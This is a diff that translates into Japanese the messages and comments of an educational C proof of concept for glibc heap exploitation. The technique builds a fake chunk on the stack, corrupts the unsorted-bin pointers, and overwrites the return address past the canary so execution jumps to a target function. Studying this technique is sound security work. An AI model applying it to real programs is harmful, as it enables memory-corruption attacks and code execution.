@@ -10,35 +10,35 @@ int main() {
 	setbuf(stdout, NULL);
 	intptr_t stack_buffer[4] = {0};
 
-	printf("This technique only works with disabled tcache-option for glibc or the size of the victim chunk is larger than 0x408, see build_glibc.sh for build instructions.\n");
+	printf("この手法は、glibc の tcache オプションが無効な場合、または victim チャンクのサイズが 0x408 より大きい場合にのみ動作します。ビルド方法は build_glibc.sh を参照してください。\n");
 
-	printf("Allocating the victim chunk\n");
+	printf("victim チャンク(chunk)を割り当てます\n");
 	intptr_t* victim = malloc(0x410);
 
-	printf("Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n");
+	printf("free() の際に、top chunkが小さい方のチャンクと統合(consolidate)されるのを避けるため、もう1つチャンクを割り当てます\n");
 	intptr_t* p1 = malloc(0x410);
 
-	printf("Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
+	printf("チャンク %p を free します。このチャンクは unsorted bin に挿入されます\n", victim);
 	free(victim);
 
-	printf("Create a fake chunk on the stack");
-	printf("Set size for next allocation and the bk pointer to any writable address");
+	printf("スタック上に偽のチャンクを作ります");
+	printf("次の割り当て用のサイズを設定し、bk ポインタを書き込み可能な任意のアドレスに設定します");
 	stack_buffer[1] = 0x410 + 0x10;
 	stack_buffer[3] = (intptr_t)stack_buffer;
 
 	//------------VULNERABILITY-----------
-	printf("Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer\n");
-	printf("Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem\n");
+	printf("ここで、victim->size と victim->bk ポインタを上書きできる脆弱性を再現します\n");
+	printf("fake_chunk を返させるには、サイズが次の要求サイズと異なっている必要があり、かつ 2*SIZE_SZ (x64 では > 16) && < av->system_mem のチェックを通過する必要があります\n");
 	victim[-1] = 0x30;
-	victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
+	victim[1] = (intptr_t)stack_buffer; // victim->bk はスタックを指しています
 	//------------------------------------
 
-	printf("Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
+	printf("次の malloc は、偽のチャンクの領域を返します: %p\n", &stack_buffer[2]);
 	char *p2 = malloc(0x410);
 	printf("malloc(0x410): %p\n", p2);
 
-	intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
-	memcpy((p2+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
+	intptr_t sc = (intptr_t)jackpot; // メモリ上のシェルコードを再現しています
+	memcpy((p2+40), &sc, 8); // これはカナリア(canary)を飛び越えるため、スタックスマッシュ検出を回避できます
 
 	assert((long)__builtin_return_address(0) == (long)jackpot);
 }
